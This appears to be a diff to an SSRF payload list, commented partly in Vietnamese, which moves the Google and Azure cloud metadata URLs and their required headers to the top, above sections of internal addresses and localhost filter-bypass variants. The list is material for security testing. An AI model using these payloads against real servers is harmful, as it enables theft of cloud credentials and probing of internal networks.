@@ -1,6 +1,13 @@
 #All payloads below after SECTION A are used to bypass basic filter `localhost, 127.0.0.1`
 #In other words, these payloads will works as `localhost/ 127.0.0.1`
-#Note that some payloads only work in Windows/ Linux, some work both
+#Note: Some payloads only work in Windows/ Linux, some work both
+#Note: Some payloads need to add Header such as `Metadata-Flavor: Google` hoặc `Metadata: true`
+#Với `computeMetadata/v1/` ta cần specify thêm header `Metadata-Flavor: Google`
+http://metadata.google.internal/computeMetadata/v1/
+#
+#
+#Với metadata của Azure ta cần specify thêm header `Metadata: true`
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
 #
 #
 #=== SECTION A: Test common resources that is not localhost
@@ -19,13 +26,6 @@ http://172.16.0.1
 http://172.17.0.1
 http://192.168.0.1
 http://192.168.1.1
-#
-#
-#Với `computeMetadata/v1/` ta cần specify thêm header `Metadata-Flavor: Google`
-http://metadata.google.internal/computeMetadata/v1/
-#
-#Với metadata của Azure ta cần specify thêm header `Metadata: true`
-http://169.254.169.254/metadata/instance?api-version=2021-02-01
 #
 #
 #=== SECTION B: Starts with `http://` + plain-text ===
